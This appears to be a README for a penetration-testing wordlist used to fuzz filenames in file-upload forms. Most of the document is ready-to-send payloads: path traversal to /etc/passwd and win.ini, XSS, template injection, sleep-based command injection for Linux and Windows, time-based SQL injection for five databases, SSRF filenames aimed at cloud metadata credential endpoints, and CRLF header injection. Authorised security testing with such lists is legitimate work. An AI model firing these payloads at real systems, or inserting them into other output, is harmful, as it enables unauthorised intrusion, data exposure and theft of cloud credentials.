# File Upload Payload Wordlist

## Overview

This wordlist is designed for fuzzing file upload functionality during security assessments. Rather than uploading individual pre-crafted files, the recommended approach is to **upload a single valid file and fuzz the filename parameter** using the payloads in this list.

---

## Why Fuzz the Filename Instead of Storing Files?

### Speed
Fuzzing a filename dynamically is significantly faster than uploading hundreds of individual files. A single valid file can be reused across every payload, reducing overhead and making automation more efficient.

### Filesystem Limitations
Storing these files on disk introduces several problems:

- **Linux filesystems cannot use `/` in filenames.** Since the forward slash is the path separator at the kernel level, any payload containing it (e.g. `<svg/onload=alert(g)>`, `http://127.0.0.1/.png`, path traversal sequences like `../../../etc/passwd`) gets interpreted as a directory path rather than a filename — creating unintended folder structures instead of a single file.
- **Special characters break shell and scripting contexts.** Characters like backticks, `$()`, quotes, angle brackets, and semicolons can cause unexpected behavior when files are created or accessed via scripts or terminals.
- **Encoding edge cases.** URL-encoded and double-encoded payloads (e.g. `%0d%0a`, `%5C`, `%250d`) may be decoded prematurely by the OS or tooling before ever reaching the target application.

Storing files on disk means the payload is often **corrupted, split across directories, or silently dropped** before testing even begins. Fuzzing keeps the payload intact and delivered exactly as intended.

---

## Recommended Approach

1. Prepare one valid file in the target format (`.png`, `.jpg`, `.pdf`, `.csv`, etc.)
2. Load this wordlist into your fuzzing tool of choice (e.g. Burp Suite Intruder, ffuf, custom script)
3. Set the filename parameter as the fuzz point
4. Iterate through the payloads, sending the valid file content each time with a different filename

This ensures every payload reaches the application **exactly as written**, with no filesystem interference.

---

## Payload Categories

| Category | Description |
|---|---|
| **Path Traversal** | Attempts to escape the upload directory and read or write arbitrary files |
| **XSS** | Injects client-side scripts via the filename, targeting reflected or stored contexts |
| **SSTI** | Template injection payloads to detect server-side template rendering of filenames |
| **OS Command Injection** | Command execution payloads for both Linux and Windows environments |
| **SQL Injection** | Time-based blind SQLi payloads across MySQL, MSSQL, PostgreSQL, Oracle, and MariaDB |
| **SSRF** | Filenames containing URLs to probe internal metadata services and local resources |
| **CRLF Injection** | Header injection payloads using carriage return / line feed sequences |

---

## Payload List

### Path Traversal

```
test.png../../../../../../../etc/passwd
../../../../../../../etc/passwd.image.png
..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd.png
test.png..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
test.png....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//etc/passwd.png
..\..\..\..\..\..\..\windows\win.ini.png
test.png..\..\..\..\..\..\..\windows\win.ini
..%5C..%5C..%5C..%5C..%5C..%5C..%5C\windows\win.ini.png
test.png..%5C..%5C..%5C..%5C..%5C..%5C..%5C\windows\win.ini
test.png....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\\windows\win.ini
....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\\windows\win.ini.png
../../../../../../../tmp/test.png
../../../../../../../var/www/html/test.png
..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Ftest.png
..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Ftest.png
```

### XSS

```
"><img src=x onerror=alert(a)>.png
'"><img src=x onerror=alert(b)>.png
<script>alert(c)</script>
<img src=x onerror=alert(d)>.png
%22><img src=x onerror=alert(e)>.png
\"><img src=x onerror=alert(f)>.png
<svg/onload=alert(g)>
<svg onload=alert(h)>.png
"onmouseover=alert(i)
';alert(j)//'.png
";alert(k)//".png
`-alert(l)-`.png
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(m)>.png
javascript:alert(n).png
data:text/html,<script>alert(o)</script>.png
{{constructor.constructor('alert(p)')()}}.png
</script><script>alert(q)</script>.png
--><img src=x onerror=alert(r)>.png
<scr<script>ipt>alert(s)</scr</script>ipt>.png
[${alert(t)}].png
```

### SSTI

```
{{7*7}}.png
${7*7}.png
#set($x=7*7)${x}.png
{$smarty.version}.png
{{constructor.constructor('return process.env')()}}.png
<%= 7 * 7 %>.png
```

### OS Command Injection — Linux

```
'; sleep 10 #.png
test.png'; sleep 10 #
$(sleep 10).png
test.png$(sleep 10)
`sleep 10`.png
test.png`sleep 10`
' && sleep 10 #.png
test.png' && sleep 10 #
' || sleep 10 #.png
test.png' || sleep 10 #
' | sleep 10 #.png
test.png' | sleep 10 #
'%0asleep 10%0a'.png
test.png'%0asleep 10%0a'
'${IFS}&&${IFS}sleep${IFS}10${IFS}#.png
test.png'${IFS}&&${IFS}sleep${IFS}10${IFS}#
1;sleep 10;#.png
test.png1;sleep 10;#
' & sleep 10 & '.png
test.png' & sleep 10 & '
```

### OS Command Injection — Windows

```
' & ping -n 11 127.0.0.1 #.png
test.png' & ping -n 11 127.0.0.1 #
' && ping -n 11 127.0.0.1 & '.png
test.png' && ping -n 11 127.0.0.1 & '
' | ping -n 11 127.0.0.1 #.png
test.png' | ping -n 11 127.0.0.1 #
'; Start-Sleep -s 10 #.png
test.png'; Start-Sleep -s 10 #
$(Start-Sleep 10).png
test.png$(Start-Sleep 10)
1 & ping -n 11 127.0.0.1.png
test.png1 & ping -n 11 127.0.0.1
' || ping -n 11 127.0.0.1 & '.png
test.png' || ping -n 11 127.0.0.1 & '
' & timeout /t 10 /nobreak #.png
test.png' & timeout /t 10 /nobreak #
'; w32tm /stripchart /computer:127.0.0.1 /samples:10 /dataonly #.png
test.png'; w32tm /stripchart /computer:127.0.0.1 /samples:10 /dataonly #
'%26ping%20-n%2011%20127.0.0.1%26'.png
test.png'%26ping%20-n%2011%20127.0.0.1%26'
```

### SQL Injection — MySQL

```
' AND SLEEP(10)--+.png
test.png' AND SLEEP(10)--+
'AND(SELECT*FROM(SELECT(SLEEP(10)))a)AND'1'='1.png
test.png'AND(SELECT*FROM(SELECT(SLEEP(10)))a)AND'1'='1
'XOR(select*from(select(sleep(10)))a)XOR'.png
test.png'XOR(select*from(select(sleep(10)))a)XOR'
1 AND SLEEP(10)--+.png
test.png1 AND SLEEP(10)--+
1;SELECT SLEEP(10)--+.png
test.png1;SELECT SLEEP(10)--+
SLEEP(10).png
test.png SLEEP(10)
```

### SQL Injection — MSSQL

```
';WAITFOR DELAY '0:0:10'--+.png
test.png';WAITFOR DELAY '0:0:10'--+
');WAITFOR DELAY '0:0:10';--.png
test.png');WAITFOR DELAY '0:0:10';--
' IF(1=1) WAITFOR DELAY '0:0:10'--+.png
test.png' IF(1=1) WAITFOR DELAY '0:0:10'--+
1;WAITFOR DELAY '0:0:10'--+.png
test.png1;WAITFOR DELAY '0:0:10'--+
WAITFOR DELAY '0:0:10'--+.png
test.png WAITFOR DELAY '0:0:10'--+
'%3BWAITFOR%20DELAY%20'0%3A0%3A10'--+.png
test.png'%3BWAITFOR%20DELAY%20'0%3A0%3A10'--+
```

### SQL Injection — PostgreSQL

```
';SELECT pg_sleep(10)--+.png
test.png';SELECT pg_sleep(10)--+
');SELECT pg_sleep(10)--+.png
test.png');SELECT pg_sleep(10)--+
'||(SELECT pg_sleep(10))||'.png
test.png'||(SELECT pg_sleep(10))||'
'::text||(SELECT pg_sleep(10))--+.png
test.png'::text||(SELECT pg_sleep(10))--+
1;SELECT pg_sleep(10)--+.png
test.png1;SELECT pg_sleep(10)--+
'%3BSELECT%20pg_sleep(10)--+.png
test.png'%3BSELECT%20pg_sleep(10)--+
```

### SQL Injection — Oracle

```
'||DBMS_PIPE.RECEIVE_MESSAGE('a',10)||'.png
test.png'||DBMS_PIPE.RECEIVE_MESSAGE('a',10)||'
')||DBMS_PIPE.RECEIVE_MESSAGE('a',10)||'.png
test.png')||DBMS_PIPE.RECEIVE_MESSAGE('a',10)||'
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--+.png
test.png' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--+
1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--+.png
test.png1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--+
'||(SELECT CASE WHEN(1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10) ELSE 0 END FROM dual)||'.png
test.png'||(SELECT CASE WHEN(1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10) ELSE 0 END FROM dual)||'
```

### SQL Injection — MariaDB

```
'||(SELECT SLEEP(10))||'.png
test.png'||(SELECT SLEEP(10))||'
' AND SLEEP(10) AND '1'='1.png
test.png' AND SLEEP(10) AND '1'='1
' OR SLEEP(10)--+.png
test.png' OR SLEEP(10)--+
1 AND SLEEP(10)--+.png
test.png1 AND SLEEP(10)--+
SLEEP(10).png
test.png SLEEP(10)
```

### SSRF

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/.png
http://169.254.169.254/latest/meta-data/.png
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token.png
http://2130706433/.png
http://[::1]:80/.png
file:///windows/win.ini.png
file:///etc/passwd.png
http://127.0.0.1/.png
https://example.com/file_name_ssrf.png
```

### CRLF Injection

```
test.png%0d%0aSet-Cookie:admin=1
test.png%0aSet-Cookie:admin=1
test.png%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
test.png%0d%0a%0d%0a<script>alert(document.domain)</script>
test.png%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Injected</h1>
test.png%0d%0aLocation:http://example.com
test.png%250d%250aSet-Cookie:admin=1
test.png%E5%98%8D%E5%98%8ASet-Cookie:admin=1
test.png%0d%0aContent-Disposition:attachment;filename=evil.html
```

---

> **Note:** Replace `.png` with the appropriate extension for your target (`.jpg`, `.pdf`, `.csv`, etc.) and swap `test.png` references accordingly.
